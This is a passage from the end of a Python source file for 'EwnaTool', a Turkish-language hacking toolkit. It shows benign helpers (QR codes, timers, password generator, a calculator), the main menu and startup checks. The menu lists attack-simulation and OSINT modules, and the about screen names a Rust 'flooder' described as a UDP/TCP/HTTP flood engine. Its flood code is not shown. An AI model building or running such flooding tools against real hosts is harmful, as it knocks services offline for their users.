                d = json.loads(urllib.request.urlopen(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp,org,as,proxy,hosting,query", timeout=10).read())
                for k, v in d.items(): print(f"  {C.CYAN}{k}{C.RESET}: {v}")
            except Exception as e: error(str(e))
            pause()

# ═══════════════════════════════════════════════════════════════
# MODÜL 8: YARDIMCI ARAÇLAR
# ═══════════════════════════════════════════════════════════════
def modul_yardimci():
    while True:
        clear(); title("MODÜL 8: YARDIMCILAR", C.CYAN)
        print(f"""
  {C.CYAN}[1]{C.RESET} QR Kod Üret
  {C.CYAN}[2]{C.RESET} Rastgele Veri
  {C.CYAN}[3]{C.RESET} Zamanlayıcı
  {C.CYAN}[4]{C.RESET} Kronometre
  {C.CYAN}[5]{C.RESET} Hesap Makinesi
  {C.CYAN}[6]{C.RESET} Not Defteri
  {C.CYAN}[7]{C.RESET} Rastgele Şifre Toplu
  {C.CYAN}[8]{C.RESET} Lorem Ipsum Üret
  {C.CYAN}[0]{C.RESET} Ana Menü
""")
        s = prompt()
        if s == "0": return
        elif s == "1":
            clear(); title("QR KOD", C.CYAN)
            d = prompt("Veri")
            try:
                import qrcode
                q = qrcode.QRCode(); q.add_data(d); q.make(); q.print_ascii(invert=True)
            except ImportError: error("pip install qrcode")
            except Exception as e: error(str(e))
            pause()
        elif s == "2":
            clear(); title("RASTGELE VERİ", C.CYAN)
            try:
                n = int(prompt("Byte (32)") or "32")
                d = os.urandom(n)
                print(f"  {C.CYAN}Hex:{C.RESET} {d.hex()}")
                print(f"  {C.CYAN}B64:{C.RESET} {base64.b64encode(d).decode()}")
            except Exception as e: error(str(e))
            pause()
        elif s == "3":
            clear(); title("ZAMANLAYICI", C.CYAN)
            try:
                t = int(prompt("Saniye (60)") or "60")
                for i in range(t, 0, -1):
                    print(f"\r{C.CYAN}{i:3d}{C.RESET} kaldı", end=""); time.sleep(1)
                print(); success("Süre doldu!")
            except Exception as e: error(str(e))
            pause()
        elif s == "4":
            clear(); title("KRONOMETRE", C.CYAN)
            info("Başlat: Enter, Durdur: Ctrl+C"); input()
            st = time.time()
            try:
                while True:
                    print(f"\r{C.CYAN}{time.time()-st:.2f}{C.RESET}", end="")
                    time.sleep(0.01)
            except KeyboardInterrupt:
                print(); success(f"{time.time()-st:.2f} sn")
            pause()
        elif s == "5":
            clear(); title("HESAP", C.CYAN)
            try:
                e = prompt("İşlem")
                print(f"  = {eval(e, {'__builtins__': {}}, {})}")
            except Exception as e: error(str(e))
            pause()
        elif s == "6":
            clear(); title("NOT", C.CYAN)
            p = prompt("Dosya (not.txt)") or "not.txt"
            info("Bitirmek için boş satır")
            lines = []
            while True:
                l = input()
                if not l: break
                lines.append(l)
            with open(p, "a", encoding="utf-8") as f:
                f.write(f"\n--- {datetime.now()} ---\n"); f.write("\n".join(lines) + "\n")
            success(p)
            pause()
        elif s == "7":
            clear(); title("TOPLU ŞİFRE", C.CYAN)
            try:
                n = int(prompt("Adet (10)") or "10")
                L = int(prompt("Uzunluk (16)") or "16")
                chars = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"
                for i in range(n):
                    print(f"  {C.CYAN}{i+1:3d}.{C.RESET} {''.join(random.choice(chars) for _ in range(L))}")
            except Exception as e: error(str(e))
            pause()
        elif s == "8":
            clear(); title("LOREM IPSUM", C.CYAN)
            words = "lorem ipsum dolor sit amet consectetur adipiscing elit sed do eiusmod tempor incididunt ut labore et dolore magna aliqua".split()
            try:
                n = int(prompt("Kelime sayısı (50)") or "50")
                print("  " + " ".join(random.choice(words) for _ in range(n)))
            except Exception as e: error(str(e))
            pause()

# ═══════════════════════════════════════════════════════════════
# ANA MENÜ
# ═══════════════════════════════════════════════════════════════
def ana_menu():
    while True:
        clear()
        print(f"{C.CYAN}{BANNER}{C.RESET}")
        line("─", 71, C.CYAN)
        print(f"{C.BOLD}{C.WHITE}  ANA MENÜ  (Rust Core + Python Interface){C.RESET}")
        line("─", 71, C.CYAN)
        print(f"""
  {C.BLUE}[1]{C.RESET} 🌐 Ağ Araçları        {C.DIM}(12 araç){C.RESET}
  {C.MAGENTA}[2]{C.RESET} 🔐 Kriptografi        {C.DIM}(12 araç){C.RESET}
  {C.GREEN}[3]{C.RESET} 💻 Sistem Bilgisi     {C.DIM}(7 araç){C.RESET}
  {C.YELLOW}[4]{C.RESET} 📁 Dosya Araçları     {C.DIM}(9 araç){C.RESET}
  {C.RED}[5]{C.RESET} 🌍 Web Araçları       {C.DIM}(10 araç){C.RESET}
  {C.RED}[6]{C.RESET} ⚔️  Saldırı Sim.     {C.DIM}(6 araç - Rust){C.RESET}
  {C.MAGENTA}[7]{C.RESET} 🔍 OSINT              {C.DIM}(9 araç){C.RESET}
  {C.CYAN}[8]{C.RESET} 🛠️  Yardımcılar       {C.DIM}(8 araç){C.RESET}
  {C.WHITE}[9]{C.RESET} ℹ️  Hakkında
  {C.WHITE}[0]{C.RESET} 🚪 Çıkış
""")
        line("─", 71, C.CYAN)
        s = prompt("EwnaTool")
        
        if s == "0":
            clear(); print(f"{C.CYAN}{BANNER}{C.RESET}")
            print(f"{C.GREEN}  Çıkış... Görüşürüz!{C.RESET}\n"); sys.exit(0)
        elif s == "1": modul_ag()
        elif s == "2": modul_kripto()
        elif s == "3": modul_sistem()
        elif s == "4": modul_dosya()
        elif s == "5": modul_web()
        elif s == "6": modul_saldiri()
        elif s == "7": modul_osint()
        elif s == "8": modul_yardimci()
        elif s == "9":
            clear(); print(f"{C.CYAN}{BANNER}{C.RESET}")
            title("HAKKINDA", C.CYAN)
            print(f"""
  {C.BOLD}EwnaTool v2.0.0{C.RESET}
  {C.DIM}Rust Core + Python Interface{C.RESET}

  {C.CYAN}Geliştirici :{C.RESET} 'Ewnaskia
  {C.CYAN}Çekirdek    :{C.RESET} Rust (10-100x hızlı)
  {C.CYAN}Arayüz      :{C.RESET} Python 3.8+
  {C.CYAN}Modül Sayısı:{C.RESET} 8 modül, 70+ araç
  {C.CYAN}Lisans      :{C.RESET} MIT

  {C.YELLOW}Rust Modülleri:{C.RESET}
    • scanner   - Yüksek hızlı port tarayıcı
    • flooder   - UDP/TCP/HTTP flood motoru
    • hasher    - Çok algoritmalı hash
    • dnsx      - Toplu DNS çözümleyici
    • netprobe  - Ping sweep + banner grab
""")
            pause()
        else:
            error("Geçersiz!"); time.sleep(1)

# ═══════════════════════════════════════════════════════════════
# GİRİŞ
# ═══════════════════════════════════════════════════════════════
if __name__ == "__main__":
    try:
        clear()
        print(f"{C.CYAN}{BANNER}{C.RESET}")
        loading("EwnaTool v2.0 başlatılıyor...", 1.2)
        loading("Rust çekirdek kontrol ediliyor...", 0.8)
        
        # Rust binary kontrol
        missing = []
        for b in ["scanner", "flooder", "hasher", "dnsx", "netprobe"]:
            if not has_rust(b): missing.append(b)
        if missing:
            warn(f"Eksik Rust binary: {', '.join(missing)}")
            warn("Derlemek için: ./build.sh")
        else:
            success("Tüm Rust modülleri hazır")
        
        loading("Modüller yükleniyor...", 0.8)
        time.sleep(0.3)
        ana_menu()
    except KeyboardInterrupt:
        clear(); print(f"\n{C.YELLOW}[!] Durduruldu{C.RESET}\n"); sys.exit(0)